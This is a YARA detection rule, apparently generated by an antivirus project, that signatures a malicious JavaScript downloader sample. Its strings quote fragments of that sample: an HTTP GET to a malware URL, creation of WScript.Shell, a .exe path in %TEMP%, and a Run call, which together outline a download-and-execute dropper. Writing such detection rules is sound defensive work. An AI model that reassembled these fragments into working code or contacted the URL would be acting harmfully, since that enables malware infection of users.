rule sig_20160330_5ae0d76eb70faf6a26b02498c9d6529a {
  meta:
    description = "datamaliciousorder - file 20160330_5ae0d76eb70faf6a26b02498c9d6529a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1c2ec9ee89338fc81aac9346443e372a649ff9913ea1c51a98f0c693c1520b2b"

  strings:
    $s1  = "C[Q0](\"GET\", \"http://xn--po-wqa.pl/a8zkde\", false);" fullword ascii
    $s2  = "function G(IT, W0){EM = EM * 1; return IT - W0;};" fullword ascii
    $s3  = "var FD = function Q() {return WScript[J](\"WScript\"+\".Shell\");}(), K0 = 11;" fullword ascii
    $s4  = "if (C[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function NG() {return FD[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"xQtZxwPX4HVo.ex\" + \"e\";};" fullword ascii
    $s6  = "function Z(){return DM + \"\";};" fullword ascii
    $s7  = "function E() {return ((F == true) && (F == M0)) ? 1 : EM;};" fullword ascii
    $s8  = "function Y(W){FD[\"Run\"](W, EM, EM);};" fullword ascii
    $s9  = "function M()" fullword ascii
    $s10 = "function X(){return 22;};" fullword ascii
    $s11 = "return G(L0, H);" fullword ascii
    $s12 = "function KE(){return J;};" fullword ascii
    $s13 = "function K(O) {var CY = (1, 2, 3, 4, 5, O); return CY;};" fullword ascii
    $s14 = "}while (JK);" fullword ascii
    $s15 = "var OE = new this[\"Date\"]();" fullword ascii
    $s16 = "var F = false;" fullword ascii
    $s17 = "F = true; " fullword ascii
    $s18 = "M0 = true; " fullword ascii
    $s19 = "var M0 = false;" fullword ascii
    $s20 = "var Z1 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}